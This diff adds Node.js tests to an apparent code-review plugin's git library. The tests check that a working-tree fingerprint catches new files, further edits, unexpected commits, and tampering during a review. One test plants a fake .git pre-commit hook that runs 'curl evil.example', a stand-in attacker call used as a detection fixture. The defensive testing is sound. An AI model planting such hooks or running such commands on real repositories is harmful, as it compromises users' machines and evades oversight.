@@ -3,7 +3,12 @@ import path from "node:path";
 import test from "node:test";
 import assert from "node:assert/strict";
 
-import { collectReviewContext, resolveReviewTarget } from "../plugins/grok/scripts/lib/git.mjs";
+import {
+  collectReviewContext,
+  diffWorkingTreeFingerprints,
+  fingerprintWorkingTree,
+  resolveReviewTarget
+} from "../plugins/grok/scripts/lib/git.mjs";
 import { initGitRepo, makeTempDir, run } from "./helpers.mjs";
 
 test("resolveReviewTarget prefers working tree when repo is dirty", () => {
@@ -247,6 +252,61 @@ test("collectReviewContext bounds the untracked content it inlines in lightweigh
   assert.match(context.collectionGuidance, /read it with your file tools/);
   assert.ok(Buffer.byteLength(context.content, "utf8") < 8000, "the prompt must stay close to the budget");
   assert.equal(context.inlinedEverything, false);
+});
+
+test("fingerprintWorkingTree catches new files and further edits to already-modified files", () => {
+  const cwd = makeTempDir();
+  initGitRepo(cwd);
+  fs.writeFileSync(path.join(cwd, "a.js"), "export const value = 'v1';\n");
+  run("git", ["add", "a.js"], { cwd });
+  run("git", ["commit", "-m", "init"], { cwd });
+  fs.writeFileSync(path.join(cwd, "a.js"), "export const value = 'v2';\n");
+
+  const before = fingerprintWorkingTree(cwd);
+  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)), [], "an idle tree must not trip");
+
+  fs.writeFileSync(path.join(cwd, "leaked.txt"), "x\n");
+  // Already modified, so the status code does not move — and this edit keeps
+  // the line counts too, so only the content of the diff gives it away.
+  fs.writeFileSync(path.join(cwd, "a.js"), "export const value = 'v3';\n");
+
+  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)), ["a.js", "leaked.txt"]);
+});
+
+test("fingerprintWorkingTree catches a hook planted inside .git", () => {
+  const cwd = makeTempDir();
+  initGitRepo(cwd);
+  fs.writeFileSync(path.join(cwd, "a.js"), "export const value = 'v1';\n");
+  run("git", ["add", "a.js"], { cwd });
+  run("git", ["commit", "-m", "init"], { cwd });
+
+  const before = fingerprintWorkingTree(cwd);
+  fs.mkdirSync(path.join(cwd, ".git", "hooks"), { recursive: true });
+  fs.writeFileSync(path.join(cwd, ".git", "hooks", "pre-commit"), "#!/bin/sh\ncurl evil.example\n");
+
+  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)), [".git/hooks/pre-commit"]);
+});
+
+test("fingerprintWorkingTree catches a commit that leaves the tree looking untouched", () => {
+  const cwd = makeTempDir();
+  initGitRepo(cwd);
+  fs.writeFileSync(path.join(cwd, "a.js"), "export const value = 'v1';\n");
+  run("git", ["add", "a.js"], { cwd });
+  run("git", ["commit", "-m", "init"], { cwd });
+  fs.writeFileSync(path.join(cwd, "a.js"), "export const value = 'v2';\n");
+
+  const before = fingerprintWorkingTree(cwd);
+  run("git", ["commit", "-am", "committed by the review"], { cwd });
+
+  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)), ["HEAD", "a.js"]);
+});
+
+test("fingerprintWorkingTree works before the first commit", () => {
+  const cwd = makeTempDir();
+  initGitRepo(cwd);
+  const before = fingerprintWorkingTree(cwd);
+  fs.writeFileSync(path.join(cwd, "x.txt"), "x\n");
+  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)), ["x.txt"]);
 });
 
 /**
